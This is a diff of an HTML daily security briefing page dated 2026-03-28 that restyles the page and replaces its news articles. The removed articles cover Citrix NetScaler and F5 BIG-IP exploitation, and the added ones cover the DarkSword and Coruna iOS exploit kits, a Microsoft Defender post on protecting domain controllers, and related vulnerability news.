@@ -3,88 +3,70 @@
     <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <title>Cyber-Security Daily</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Daily Security Briefing</title>
         <style>
-            body { background:#000; color:#eee; font-family: 'Courier New', monospace; padding: 40px; line-height: 1.6; max-width: 900px; margin: auto; }
-            h1 { border-bottom: 2px solid #00FF00; color: #00FF00; padding-bottom: 10px; }
-            .menu { margin-bottom: 50px; background: #111; padding: 20px; border: 1px solid #333; }
-            ul { list-style: decimal-leading-zero; padding-left: 25px; }
-            li { margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 5px; color:#00FF00; }
-            button { background:none; border:none; color:#eee; text-align:left; cursor:pointer; font-family:inherit; font-size: 1.1em; }
-            button:hover { color: #00FF00; text-decoration: underline; }
-            .article-body { display:none; padding: 20px; border: 1px solid #333; margin-top: 20px; }
-            .content-text { white-space: pre-wrap; font-size: 1.1em; }
-            .active { display:block; }
+            body { 
+                background-color: #012456; 
+                color: #F2F2F2; 
+                font-family: 'Consolas', 'Lucida Console', monospace; 
+                padding: 20px; 
+                line-height: 1.6; 
+                max-width: 1000px; 
+                margin: auto; 
+            }
+            h1 { color: #FFFFFF; font-size: 1.4em; border-bottom: 2px solid #F2F2F2; padding-bottom: 10px; margin-bottom: 30px; }
+            .menu { margin-bottom: 40px; }
+            ul { list-style-type: decimal-leading-zero; padding-left: 25px; }
+            li { margin-bottom: 12px; color: #EBCB8B; }
+            button { 
+                background: none; border: none; color: #F2F2F2; 
+                text-align: left; cursor: pointer; font-family: inherit; 
+                font-size: 1.05em; padding: 0;
+            }
+            button:hover { color: #FFFF00; text-decoration: underline; }
+            .article-body { display: none; margin-top: 20px; }
+            .article-title { color: #FFFFFF; font-size: 1.3em; margin-bottom: 5px; }
+            .source-link { color: #A3BE8C; font-size: 0.9em; }
+            .source-link a { color: #A3BE8C; text-decoration: none; }
+            .source-link a:hover { text-decoration: underline; }
+            .content-text { 
+                white-space: pre-wrap; 
+                padding: 15px 0;
+                font-size: 1em;
+                border-top: 1px solid #4C566A;
+                margin-top: 15px;
+            }
+            .back-btn { color: #FFFF00; border: 1px solid #FFFF00; padding: 6px 12px; margin-top: 15px; transition: 0.2s; }
+            .back-btn:hover { background: #FFFF00; color: #012456; }
+            .separator { border: 0; border-top: 1px dashed #4C566A; margin: 50px 0; }
+            .active { display: block; }
+            footer { 
+                text-align: center; 
+                margin-top: 60px; 
+                padding: 30px; 
+                border-top: 1px solid #4C566A; 
+                font-size: 0.85em; 
+                color: #A3BE8C;
+            }
+            footer a { color: #A3BE8C; text-decoration: underline; }
+            .disclaimer { opacity: 0.8; font-size: 0.9em; max-width: 700px; margin: 15px auto; line-height: 1.4; }
+            @media (max-width: 600px) {
+                body { padding: 15px; font-size: 15px; }
+                h1 { font-size: 1.2em; }
+                ul { padding-left: 20px; }
+            }
         </style>
     </head>
     <body>
-        <h1>CYBER-SECURITY DAILY DEBRIEF // 2026-03-28</h1>
+        <h1>Security Briefing // 2026-03-28</h1>
         <div class="menu">
-            <p style="color:#888; font-size:0.8em;">[TOP 10 ARTICLES SELECTED]</p>
-            <ul><li><button onclick="show('art-0')">Citrix NetScaler Under Active Recon for CVE-2026-3055 (CVSS 9.3) Memory Overread Bug</button></li><li><button onclick="show('art-1')">CISA Adds CVE-2025-53521 to KEV After Active F5 BIG-IP APM Exploitation</button></li><li><button onclick="show('art-2')">TA446 Deploys DarkSword iOS Exploit Kit in Targeted Spear-Phishing Campaign</button></li><li><button onclick="show('art-3')">Backdoored Telnyx PyPI package pushes malware hidden in WAV audio</button></li><li><button onclick="show('art-4')">Friday Squid Blogging: Bioluminescent Bacteria in Squid</button></li><li><button onclick="show('art-5')">Apple Sends Lock Screen Alerts to Outdated iPhones Over Active Web-Based Exploits</button></li><li><button onclick="show('art-6')">TeamPCP Pushes Malicious Telnyx Versions to PyPI, Hides Stealer in WAV Files</button></li><li><button onclick="show('art-7')">Fake VS Code alerts on GitHub spread malware to developers</button></li><li><button onclick="show('art-8')">China Upgrades the Backdoor It Uses to Spy on Telcos Globally</button></li><li><button onclick="show('art-9')">Wartime Usage of Compromised IP Cameras Highlight Their Danger</button></li></ul>
+            <ul><li><button onclick="show('art-0')">TA446 Deploys DarkSword iOS Exploit Kit in Targeted Spear-Phishing Campaign</button></li><li><button onclick="show('art-1')">Backdoored Telnyx PyPI package pushes malware hidden in WAV audio</button></li><li><button onclick="show('art-2')">How Microsoft Defender protects high-value assets in real-world attack scenarios</button></li><li><button onclick="show('art-3')">Leveling Up Secure Code Reviews with Claude Code</button></li><li><button onclick="show('art-4')">Coruna iOS Kit Reuses 2023 Triangulation Exploit Code in Recent Mass Attacks</button></li><li><button onclick="show('art-5')">Building a Detection Foundation: Part 4 - Sysmon</button></li><li><button onclick="show('art-6')">CISA Adds Five Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-7')">Feds Disrupt IoT Botnets Behind Huge DDoS Attacks</button></li><li><button onclick="show('art-8')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-9')">Microsoft Patch Tuesday, March 2026 Edition</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 style="color:#00FF00">>>> Citrix NetScaler Under Active Recon for CVE-2026-3055 (CVSS 9.3) Memory Overread Bug</h2>
-            <p style="color:#666">Source: <a href="https://thehackernews.com/2026/03/citrix-netscaler-under-active-recon-for.html" target="_blank" style="color:#666;">https://thehackernews.com/2026/03/citrix-netscaler-under-active-recon-for.html</a></p>
-            <div class="content-text">A recently disclosed critical security flaw impacting Citrix NetScaler ADC and NetScaler Gateway is witnessing active reconnaissance activity, according to [Defused Cyber](https://x.com/DefusedCyber/status/2037472546732310668) and [watchTowr](https://www.linkedin.com/feed/update/urn:li:activity:7443396413679529984/).
-The vulnerability, [CVE-2026-3055](https://thehackernews.com/2026/03/citrix-urges-patching-critical.html) (CVSS score: 9.3), refers to a case of insufficient input validation leading to memory overread, which an attacker could exploit to leak potentially sensitive information.
-Per Citrix, successful exploitation of the flaw hinges on the appliance being configured as a SAML Identity Provider (SAML IDP).
-"We are now observing auth method fingerprinting activity against NetScaler ADC/Gateway in the wild," Defused Cyber said in a post on X. "Attackers are probing /cgi/GetAuthMethods to enumerate enabled authentication flows in our Citrix honeypots."
-This is likely an attempt on the part of threat actors to determine if NetScaler ADC and NetScaler Gateway are indeed configured as a SAML IDP.
-In a similar warning, watchTowr said it has detected active reconnaissance against NetScaler instances in its honeypot network, raising the possibility that in-the-wild exploitation can happen anytime.
-"Organizations running affected Citrix NetScaler versions in affected configurations need to drop tools and patch immediately," the company said. "When attacker reconnaissance shifts to active exploitation, the window to respond will evaporate."
-The vulnerability affects NetScaler ADC and NetScaler Gateway versions 14.1 before 14.1-66.59 and 13.1 before 13.1-62.23, as well as NetScaler ADC 13.1-FIPS and 13.1-NDcPP before 13.1-37.262.
-In recent years, a number of security vulnerabilities affecting NetScaler have [come under active exploitation](https://thehackernews.com/2026/03/citrix-urges-patching-critical.html) in the wild. These include CVE-2023-4966 (Citrix Bleed), CVE-2025-5777 (Citrix Bleed 2), CVE-2025-6543, and CVE-2025-7775.
-It's therefore crucial that users move quickly to the latest updates as soon as possible to stay protected, as it's a matter of not if, but when.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
-        </div>
-        <div id="art-1" class="article-body">
-            <h2 style="color:#00FF00">>>> CISA Adds CVE-2025-53521 to KEV After Active F5 BIG-IP APM Exploitation</h2>
-            <p style="color:#666">Source: <a href="https://thehackernews.com/2026/03/cisa-adds-cve-2025-53521-to-kev-after.html" target="_blank" style="color:#666;">https://thehackernews.com/2026/03/cisa-adds-cve-2025-53521-to-kev-after.html</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday [added](https://www.cisa.gov/news-events/alerts/2026/03/27/cisa-adds-one-known-exploited-vulnerability-catalog) a critical security flaw impacting F5 BIG-IP Access Policy Manager (APM) to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
-The vulnerability in question is CVE-2025-53521 (CVSS v4 score: 9.3), which could allow a threat actor to achieve remote code execution.
-"When a BIG-IP APM access policy is configured on a virtual server, specific malicious traffic can lead to Remote Code Execution (RCE)," according to a description of the flaw in CVE.org.
-While the shortcoming was initially categorized and remediated as a denial-of-service (DoS) vulnerability with a CVSS v4 score of 8.7, F5 said it has been reclassified as a case of RCE in light of "new information obtained in March 2026."
-The company has since [updated](https://my.f5.com/manage/s/article/K000156741) its advisory to confirm that the vulnerability "has been exploited in the vulnerable BIG-IP versions." It did not share any additional details on who may be behind the exploitation activity.
-However, F5 published a [number of indicators](https://my.f5.com/manage/s/article/K000160486) that can be used to assess if the system has been compromised -
-- File-related indicators -
-- Presence of /run/bigtlog.pipe and/or /run/bigstart.ltm.
-- Mismatch of file hashes when compared to known good versions of /usr/bin/umount and/or /usr/sbin/httpd.
-- Mismatch of file sizes or timestamps when compared to known good versions of /usr/bin/umount and/or /usr/sbin/httpd.
-- Each release and EHF may have different file sizes and timestamps.
-- Log-related indicators -
-- An entry in "/var/log/restjavad-audit.<NUMBER>.log" showing a local user accessing the iControl REST API from localhost.
-- An entry in "/var/log/auditd/audit.log.<NUMBER>" showing a local user accessing the iControl REST API from localhost to disable SELinux.
-- Log messages in "/var/log/audit" show the results of a command being run in the audit log.
-- Other TTPs observed include -
-- Modifications to the underlying components that the system integrity checker,
-[sys-eicheck](https://my.f5.com/manage/s/article/K00029945), relies on, resulting in a failure of the tool, specifically /usr/bin/umount and/or /usr/sbin/httpd, indicating unexpected changes to the system software as mentioned above. - HTTP/S traffic from the BIG-IP system that contains HTTP 201 response codes and CSS content-type to disguise the attacker's activities.
-- Changes to the following three files, although their presence alone does not signal a security issue -
-- /var/sam/www/webtop/renderer/apm_css.php3
-- /var/sam/www/webtop/renderer/full_wt.php3
-- /var/sam/www/webtop/renderer/webtop_popup_css.php3
-- Modifications to the underlying components that the system integrity checker,
-"We have observed cases of webshell being written to disk; however, the webshells have been observed to work in memory only, meaning the files listed above might not be modified," F5 cautioned.
-The issue impacts the following versions -
-- 17.5.0 - 17.5.1 (Fixed in version 17.5.1.3)
-- 17.1.0 - 17.1.2 (Fixed in version 17.1.3)
-- 16.1.0 - 16.1.6 (Fixed in version 16.1.6.1)
-- 15.1.0 - 15.1.10 (Fixed in version 15.1.10.8)
-In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies have been given until March 30, 2026, to apply the fixes to secure their networks.
-"When F5 CVE-2025-53521 first emerged last year as a denial-of-service issue, it didn't immediately signal urgency, and many system administrators likely prioritized it accordingly," watchTowr CEO and founder Benjamin Harris said in a statement shared with The Hacker News.
-"Fast forward to today's big 'yikes' moment: the situation has changed significantly. What we're observing now is pre-auth remote code execution and evidence of in-the-wild exploitation, with a CISA KEV listing to back it up. That's a very different risk profile than what was initially communicated."
-Defused Cyber, in an X post, has also [confirmed](https://x.com/DefusedCyber/status/2037669147824488867) that it's seeing "acute scanning activity" for vulnerable F5 BIG-IP devices following the addition of CVE-2025-53521 to the KEV catalog.
-"This actor is hitting /mgmt/shared/identified-devices/config/device-info which is a F5 BIG-IP REST API endpoint used to retrieve system-level information, such as hostname, machine ID, and base MAC address," it said.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
-        </div>
-        <div id="art-2" class="article-body">
-            <h2 style="color:#00FF00">>>> TA446 Deploys DarkSword iOS Exploit Kit in Targeted Spear-Phishing Campaign</h2>
-            <p style="color:#666">Source: <a href="https://thehackernews.com/2026/03/ta446-deploys-leaked-darksword-ios.html" target="_blank" style="color:#666;">https://thehackernews.com/2026/03/ta446-deploys-leaked-darksword-ios.html</a></p>
+            <h2 class="article-title">TA446 Deploys DarkSword iOS Exploit Kit in Targeted Spear-Phishing Campaign</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/03/ta446-deploys-leaked-darksword-ios.html" target="_blank">Original Link</a></p>
             <div class="content-text">Proofpoint has [disclosed](https://x.com/threatinsight/status/2037560142880006266) details of a targeted email campaign in which threat actors with ties to Russia are leveraging the recently disclosed [DarkSword](https://thehackernews.com/2026/03/darksword-ios-exploit-kit-uses-6-flaws.html) exploit kit to target iOS devices.
 The activity has been attributed with high confidence to the Russian state-sponsored threat group known as [TA446](https://thehackernews.com/2025/01/russian-star-blizzard-shifts-tactics-to.html), which is also tracked by the broader cybersecurity community under the monikers Callisto, COLDRIVER, and Star Blizzard (formerly SEABORGIUM). It's assessed to be affiliated with Russia's Federal Security Service (FSB).
 The hacking group is [known](https://thehackernews.com/2025/10/google-identifies-three-new-russian.html) for spear-phishing campaigns aimed at harvesting credentials from targets of interest. However, attacks mounted by the threat actor over the past year have targeted victims' WhatsApp accounts, as well as leveraged various custom malware families to steal sensitive data.
@@ -101,131 +83,1147 @@ Apple's warning also coincides with the leak of a new version of DarkSword on Gi
 Justin Albrecht, principal researcher at Lookout, said the leaked, plug-and-play version allows even unskilled threat actors to deploy the advanced iOS espionage kit, turning it into commodity malware.
 "DarkSword refutes the common belief that iPhones are immune to cyber threats, and that advanced mobile attacks are only used in targeted efforts against governments and high-ranking officials," Albrecht added.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 style="color:#00FF00">>>> Backdoored Telnyx PyPI package pushes malware hidden in WAV audio</h2>
-            <p style="color:#666">Source: <a href="https://www.bleepingcomputer.com/news/security/backdoored-telnyx-pypi-package-pushes-malware-hidden-in-wav-audio/" target="_blank" style="color:#666;">https://www.bleepingcomputer.com/news/security/backdoored-telnyx-pypi-package-pushes-malware-hidden-in-wav-audio/</a></p>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Backdoored Telnyx PyPI package pushes malware hidden in WAV audio</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/backdoored-telnyx-pypi-package-pushes-malware-hidden-in-wav-audio/" target="_blank">Original Link</a></p>
             <div class="content-text">TeamPCP hackers compromised the Telnyx package on the Python Package Index today, uploading malicious versions that deliver credential-stealing malware hidden inside a WAV file. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">How Microsoft Defender protects high-value assets in real-world attack scenarios</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/03/27/microsoft-defender-protects-high-value-assets/" target="_blank">Original Link</a></p>
+            <div class="content-text">High-value assets including domain controllers, web servers, and identity infrastructure are frequent targets in sophisticated attacks. Microsoft Defender applies asset-aware protection using Microsoft Security Exposure Management to detect and block threats against these critical systems. This article explores real-world attack scenarios and defense techniques.
+As cyberthreats continue to grow in scale, speed, and sophistication, organizations must pay close attention to the systems that form their backbone: High-Value Assets (HVAs). These assets include the servers, services, identities, and infrastructure essential for business operations and security. Examples include domain controllers that manage authentication and authorization across the network; web servers hosting business-critical applications such as Exchange or SharePoint; identity systems that enable secure access across on-premises and cloud environments; and other components such as certificate authorities and internet-facing services that provide access to corporate applications.
+This reinforces a simple but important idea: not all assets carry the same risk, and protections should reflect their role and impact. To support this, we continue to expand differentiated protections for the assets that matter most. These efforts focus on helping organizations reduce risk, disrupt high-impact attack paths, and strengthen overall resilience. Microsoft Defender already provides enhanced protection for critical assets through capabilities such as [automatic attack disruption](https://www.microsoft.com/en-us/security/blog/2025/04/09/how-cyberattackers-exploit-domain-controllers-using-ransomware/). In this article, we explore how additional security layers further strengthen risk-based protection.
+Using asset context to strengthen detection
+In recent years, human-operated cyberattacks have evolved from sporadic, opportunistic intrusions into targeted campaigns designed to maximize impact. Analysis shows that in more than 78% of these attacks, threat actors successfully compromise a High-Value Asset, such as a domain controller, to gain deeper, elevated access within the organization.
+Traditional endpoint detection methods rely on behavioral signals such as process execution, command-line activity, and file operations. While effective in many scenarios, these signals often lack context about the asset being targeted. Administrative tools, scripting frameworks, and system utilities can appear identical in both legitimate and malicious use.
+This is where understanding a device’s role becomes essential. On high-value assets such as domain controllers or identity infrastructure, even small risks matter because the potential impact is significantly higher. Activities that may be routine on general-purpose servers or administrative workstations can indicate compromise when observed on Tier-0 systems.
+Defender incorporates a critical asset framework to enrich detection with this context. This intelligence is powered by Microsoft Security Exposure Management, where critical assets, attack paths, and cross-workload relationships provide the context needed to distinguish normal administrative activity from high-risk behavior. This approach also enables automatic identification of critical assets in customer environments and applies deeper, context-aware detections based on each asset’s risk profile.
+How high-value asset protection works
+- Asset classification: Security Exposure Management asset intelligence builds a high‑confidence inventory and exposure graph of an organization’s assets across devices, identities, cloud resources, and external attack surfaces. By enriching asset data with contextual signals such as predefined classifications and criticality levels based on a system’s role and function, Security Exposure Management can automatically identify and tag High-Value Assets across on-premises, hybrid, and cloud environments, providing a consistent view of the systems that are most critical to the organization.
+- Real Time Differentiated Intelligence from Cloud: HVA-aware anomaly detection extends cloud delivered protection by continuously learning what normal looks like for critical assets and highlighting activity that meaningfully deviates from those baselines. Instead of applying one size fits all thresholds, the system will evaluate behavior in the context of the asset role, sensitivity, and expected operational patterns.
+- Endpoint Delivered Protections: Targeted protections that prioritize high-impact TTPs on High-Value Assets. By incorporating device role context and critical asset intelligence from Security Exposure Management, behaviors that may appear as weak signals in isolation can be elevated to high-confidence prevention when observed on Tier-0 systems, enabling more decisive protection where the potential blast radius is greatest.
+Real-world high-value asset protection scenarios
+Focused protection for domain controllers
+Domain controllers are the backbone of on-premises environments, managing identity and access through Active Directory (AD). Because of their central role, threat actors frequently target domain controllers seeking elevated privileges. One common technique involves extracting credential data from NTDS.DIT, the Active Directory database that stores password hashes and account information for users across the domain, including highly privileged accounts such as domain administrators. On systems identified as domain controllers, Defender can apply stronger prevention powered by critical assets and attack paths, combining multiple behavioral signals that would otherwise appear benign in isolation.
+In one observed incident, the activity begins with the compromise of Machine 0, an internet-exposed server. The threat actor gained a foothold and established persistence to maintain access. This system served as the initial entry point into the environment, allowing the threat actor to begin reconnaissance and identify systems with broader access inside the network. The threat actor then laterally moved to Machine 1, a server with broader access within the network.
+On this system, the actor established a reverse SSH tunnel to threat actor-controlled infrastructure while bypassing inbound firewall restrictions and setting up an NTLM relay trap. This positioned the machine to intercept or relay authentication attempts originating from other machines in the network. Subsequently, authentication activity originating from Machine 2, a high-value system with Domain Admin privileges, interacted with the relay setup. By leveraging the captured NTLM authentication exchange, the actor was able to authenticate with elevated privileges within the domain.
+Using the leaked Domain Admin access, the threat actor then authenticated to Machine 3, a domain controller. With privileged access to the DC, the actor attempted to extract Active Directory credential data by using ntdsutil.exe to dump the NTDS.DIT database. Protections designed specifically for high‑value assets prevented the command‑line attempt, stopping execution before the database could be accessed. The activity also triggered automated disruption, resulting in the Domain Admin account being disabled, effectively stopping the threat actor from proceeding further with credential extraction and limiting the potential impact to the domain.
+In this attack, the adversary remotely created a scheduled task on a domain controller that executed ntdsutil.exe to generate a backup containing the Active Directory database. The task was configured to run as SYSTEM and then deleted shortly afterward to reduce forensic visibility.
+Individually, both behaviors, remote scheduled task creation and execution of ntdsutil.exe can occur in administrative scenarios across enterprise environments. However, by analyzing historical activity within the environment, these activities appear as outliers when combined, making it a high-confidence indicator of credential theft preparation on a domain controller. By incorporating asset role, attack path context, historical correlations, and the blast radius of the activity, Defender can deterministically block credential theft preparation on domain controllers.
+Early detection of webshells and IIS compromise
+When Defender identifies a high-value asset running the IIS role, it applies targeted inspection to locations that are commonly exposed and frequently abused during server compromise. This includes focused scanning of web-accessible directories and application paths for suspicious or unauthorized script files. In several investigations involving SharePoint and Exchange servers, this approach surfaced previously unknown and highly targeted webshells with poor detection coverage.
+In many cases, the malicious logic was inserted directly into legitimate web application files, allowing threat actors to blend into normal application behavior and maintain stealthy access to the server.
+Protection tech like AMSI for Exchange and SharePoint helps block malicious code and incoming exploitation attempts. However, if an threat actor already has elevated access inside the organization, they can target these internet-facing High-Value Assets directly. In one scenario, the threat actor had already gained access inside the organization with elevated privileges. From another compromised system, the actor remotely drops a highly customized, previously unseen webshell into EWS directory of Exchange Server.
+The webshell has file upload, download and in-memory code execution capabilities. Because the device was identified as an Exchange server hosting internet-facing content, the risk profile was significantly higher. Leveraging this role context, Defender immediately remediated the file upon creation, preventing the threat actor from establishing control over the Exchange workload.
+Expanded protection from remote credential dumping
+High‑Value Assets (HVAs) hold the most sensitive credentials in an organization, making them a primary target for adversaries once initial access is achieved. Threat actors often attempt to access credential stores remotely using administrative protocols, directory replication methods, or interactions with identity synchronization systems such as Microsoft Entra Connect.
+These activities can involve the movement or staging of sensitive artifacts, including Active Directory database files, registry hives, or identity synchronization data. Suspicious patterns such as creation of credential-related files in non-standard locations or unexpected transfers between systems may indicate attempts to compromise credentials. Incorporating device role context enables stronger protections on the systems where credential exposure poses the highest risk, such as domain controllers and identity infrastructure servers. By considering the process chains and access patterns involved, Defender can more effectively prevent exfiltration of sensitive credential data.
+Protecting your HVAs
+While Microsoft’s Security Exposure Management continues to improve automatic identification and classification of high‑value assets (HVAs) in customer environments, customers can take several concrete steps today to strengthen protection outcomes.
+1. Ensure coverage across all critical assets
+Review environments to confirm that all truly high‑value assets are identified, including assets that may not be obvious by type alone (for example, servers running privileged services or machines holding sensitive credentials). Gaps in classification can lead to gaps in protection prioritization.
+2. Prioritize security posture improvements and alert response for HVAs
+Customers should focus first on implementing security posture recommendations that apply to high-value assets, as these systems represent the greatest potential impact if compromised. Addressing gaps on HVAs delivers disproportionately higher risk reduction compared to non-critical assets.
+In addition, organizations should prioritize monitoring and rapid response for alerts originating from HVAs. Accelerating investigation and remediation for these alerts helps mitigate threats in a timely manner and significantly limits potential blast radius.
+3. Triage vulnerabilities with HVA context
+When reviewing vulnerabilities, prioritize remediation on HVAs before lower‑impact assets. A moderate vulnerability on a high‑value asset might present greater risk than a high‑severity issue on a non‑critical endpoint.
+Learn more
+Explore these resources to stay updated on the latest updates
+- To learn more about our security products, see Microsoft Defender products and services.
+[Microsoft Defender products and services – Microsoft Defender | Microsoft Learn](https://learn.microsoft.com/en-us/defender/) - To learn more about how attack disruption safeguards your domain controllers, check out this video
+[video](https://www.youtube.com/watch?v=BUGoxeoSffs). - To learn more about Security Exposure Management, see Microsoft Security Exposure Management.
+[Microsoft Security Exposure Management | Microsoft Security](https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-security-exposure-management) - To learn more about AMSI, see AMSI for SharePoint server (
+[Configure AMSI integration with SharePoint Server – SharePoint Server | Microsoft Learn](https://learn.microsoft.com/en-us/sharepoint/security-for-sharepoint-server/configure-amsi-integration)) or AMSI for Exchange server ([AMSI integration with Exchange Server | Microsoft Learn](https://learn.microsoft.com/en-us/exchange/antispam-and-antimalware/amsi-integration-with-exchange?view=exchserver-2019#overview))
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">Leveling Up Secure Code Reviews with Claude Code</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/03/26/leveling-up-secure-code-reviews-with-claude-code/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>TL;DR: Claude Code is a force multiplier when performing secure code reviews during an assessment. In this post, we discuss how to leverage Claude Code to produce digestible output that helps up better understand analyzed code base while surfacing secure and insecure coding patterns. After years of manually reviewing source code for vulnerabilities during web [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/03/26/leveling-up-secure-code-reviews-with-claude-code/">Leveling Up Secure Code Reviews with Claude Code</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <div id="art-4" class="article-body">
-            <h2 style="color:#00FF00">>>> Friday Squid Blogging: Bioluminescent Bacteria in Squid</h2>
-            <p style="color:#666">Source: <a href="https://www.schneier.com/blog/archives/2026/03/friday-squid-blogging-bioluminescent-bacteria-in-squid.html" target="_blank" style="color:#666;">https://www.schneier.com/blog/archives/2026/03/friday-squid-blogging-bioluminescent-bacteria-in-squid.html</a></p>
-            <div class="content-text"><p>The Hawaiian bobtail squid has <a href="https://phys.org/news/2026-03-bioluminescent-bacterial-partner-essential-squid.html">bioluminescent bacteria</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <h2 class="article-title">Coruna iOS Kit Reuses 2023 Triangulation Exploit Code in Recent Mass Attacks</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/03/coruna-ios-kit-reuses-2023.html" target="_blank">Original Link</a></p>
+            <div class="content-text">The kernel exploit for two security vulnerabilities used in the recently uncovered Apple iOS exploit kit known as Coruna is an updated version of the same exploit that was used in the [Operation Triangulation](https://thehackernews.com/2023/12/most-sophisticated-iphone-hack-ever.html) campaign back in 2023, according to [new findings](https://securelist.com/coruna-framework-updated-operation-triangulation-exploit/119228/) from Kaspersky.
+"When Coruna was first reported, the public evidence wasn't sufficient to link its code to Triangulation — shared vulnerabilities alone don't prove shared authorship," Boris Larin, principal security researcher at Kaspersky GReAT, told The Hacker News in a statement.
+"Coruna is not a patchwork of public exploits; it is a continuously maintained evolution of the original Operation Triangulation framework. The inclusion of checks for recent processors like the M3 and newer iOS builds shows that the original developers have actively expanded this codebase. What began as a precision espionage tool is now deployed indiscriminately."
+Coruna was [first documented](https://thehackernews.com/2026/03/coruna-ios-exploit-kit-uses-23-exploits.html) by Google and iVerify earlier this month as targeting Apple iPhone models running iOS versions between 13.0 and 17.2.1.
+Although the use of the kit was first used by a customer of an unnamed surveillance company early last year, it has since been leveraged by a suspected Russia-aligned nation-state actor in watering hole attacks in Ukraine and in a mass exploitation campaign that employed a cluster of fake Chinese gambling and cryptocurrency websites to deliver a data-stealing malware known as PlasmaLoader (aka PLASMAGRID).
+The exploit kit contains five full iOS exploit chains and a total of 23 exploits, including CVE-2023-32434 and CVE-2023-38606, both of which were [first used as zero-days](https://thehackernews.com/2023/12/most-sophisticated-iphone-hack-ever.html) in Operation Triangulation, a sophisticated campaign targeting iOS devices that involved the exploitation of four vulnerabilities in Apple's mobile operating system.
+The latest findings from Kaspersky indicated the kernel exploits in both Triangulation and Coruna were created by the same author, with Coruna also using four additional kernel exploits. The Russian security vendor said all these exploits are built on the same kernel exploitation framework and share common code.
+Specifically, the code includes support for Apple's A17, M3, M3 Pro, and M3 Max processors, along with checks for iOS 17.2 and iOS version 16.5 beta 4, the latter of which patched all four vulnerabilities exploited as part of Operation Triangulation. The check for iOS 17.2, on the other hand, is meant to take into account the newer exploits, Kaspersky said.
+The starting point of the attack is when a user visits a compromised website on Safari, causing a stager to fingerprint the browser and serve the appropriate exploit based on the browser and operating system version. This, in turn, paves the way for the execution of a payload that triggers the kernel exploit.
+"After downloading the necessary components, the payload begins executing kernel exploits, Mach-O loaders, and the malware launcher," Kaspersky said. "The payload selects an appropriate Mach-O loader based on the firmware version, CPU, and presence of the iokit-open-service permission."
+The launcher is the primary orchestrator responsible for initiating the post-exploitation activities, leveraging the kernel exploit to drop and execute the final implant. It also cleans up exploitation artifacts to cover up the forensic trail.
+"Originally developed for cyber-espionage purposes, this framework is now being used by cybercriminals of a broader kind, placing millions of users with unpatched devices at risk," Larin said. "Given its modular design and ease of reuse, we expect that other threat actors will begin incorporating it into their attacks."
